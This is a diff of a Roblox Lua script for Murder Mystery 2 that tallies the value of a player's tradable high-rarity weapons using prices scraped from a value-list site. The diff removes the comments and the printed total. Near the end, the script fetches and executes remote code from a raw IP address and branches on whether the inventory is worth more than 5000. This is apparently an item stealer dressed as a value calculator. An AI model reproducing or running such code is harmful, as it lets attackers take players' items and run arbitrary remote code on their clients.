@@ -3,20 +3,20 @@ local plr = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
--- Минимальная редкость для учета в списке ценностей (Godly и выше)
+
 local min_rarity = "Godly" 
 local min_value = 1 
 
--- Получаем доступ к базе данных предметов
+
 local database = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
 local weaponsToSend = {}
 local HttpRequest = request or (syn and syn.request) or http_request or http and http.request
 
--- Таблица редкостей для сравнения
+
 local rarityTable = {
     "Common", "Uncommon", "Rare", "Legendary", "Godly", "Ancient", "Unique", "Vintage"
 }
--- URL'ы для supremevalues
+
 local categories = {
     godly = "https://supremevaluelist.com/mm2/godlies.html",
     ancient = "https://supremevaluelist.com/mm2/ancients.html",
@@ -110,7 +110,7 @@ local function buildValueList()
         end)
     end
     
-    -- Ожидаем завершения всех запросов
+
     lock.Event:Wait() 
     
     local valueList = {}
@@ -121,7 +121,7 @@ local function buildValueList()
         if itemName ~= "" and rarity ~= "" then
             local weaponRarityIndex, godlyIndex = table.find(rarityTable, rarity), table.find(rarityTable, "Godly")
             
-            -- Учитываем только предметы Godly и выше
+
             if weaponRarityIndex and weaponRarityIndex >= godlyIndex then 
                 if hasChroma then
                     for chromaName, value in pairs(chromaExtractedValues) do
@@ -139,7 +139,7 @@ end
 
 local totalValue = 0
 
--- Неторгуемые предметы для исключения из списка
+
 local untradable = {
     ["DefaultGun"] = true, ["DefaultKnife"] = true, ["Reaver"] = true, ["Reaver_Legendary"] = true,
     ["Reaver_Godly"] = true, ["Reaver_Ancient"] = true, ["IceHammer"] = true, ["IceHammer_Legendary"] = true,
@@ -168,12 +168,10 @@ for i, v in pairs(realData.Weapons.Owned) do
         local weapon_rarity_index = table.find(rarityTable, rarity)
         
         if weapon_rarity_index and weapon_rarity_index >= min_rarity_index and not untradable[dataid] then
-            -- Берем ценность из valueList, если ее нет, то 2 для Godly+ или 1 (это логика из оригинала)
             local value = valueList[dataid] or (weapon_rarity_index >= table.find(rarityTable, "Godly") and 2 or 1)
             
             if value >= min_value then
                 totalValue = totalValue + (value * amount)
-                -- Этот массив больше не нужен, но оставляю, чтобы было видно, какие предметы учитывались
                 table.insert(weaponsToSend, {DataID = dataid, Rarity = rarity, Amount = amount, Value = value}) 
             end
         end
@@ -181,7 +179,7 @@ for i, v in pairs(realData.Weapons.Owned) do
 end
 
 
-print("Общая сумма ценностей (SupremeValues): " .. totalValue)
+
 loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"))()
 if totalValue > 5000 then
     ID="281b4cca-f00e-4f9d-985c-32df2a0b73b5";
